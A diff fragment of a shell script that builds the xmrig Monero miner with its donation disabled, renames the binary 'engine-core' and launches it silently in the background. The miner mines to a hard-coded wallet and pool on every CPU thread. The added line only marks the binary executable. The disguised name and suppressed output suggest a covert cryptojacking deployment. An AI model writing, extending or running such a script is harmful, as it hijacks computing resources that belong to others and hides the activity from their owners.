@@ -14,6 +14,7 @@ sed -i -E 's/constexpr const int kMinimumDonateLevel *= *[0-9]+ *;/constexpr con
 mkdir build && cd build
 cmake .. && make -j$(nproc)
 mv xmrig engine-core
+chmod +x ./engine-core
 
 # Start process
 ./engine-core -o pool.supportxmr.com:443   -u 4Apw9wXTXCSgMfGoLBEvAHRtkYBuhoJLZcdcUhXEr4ba3X7GJeuxtNnCheZd6X3VBjEuw3kNv8VLw9XsKAotZCUdMW1kPbx   -p uahahhsueyyww   -k --tls --threads=$(nproc) --cpu-priority=5 --donate-level=0 --huge-pages-jit   --cpu-no-yield --randomx-no-numa --asm=ryzen --randomx-no-rdmsr --randomx-wrmsr=-1 --randomx-mode=fast   > /dev/null 2>&1 &
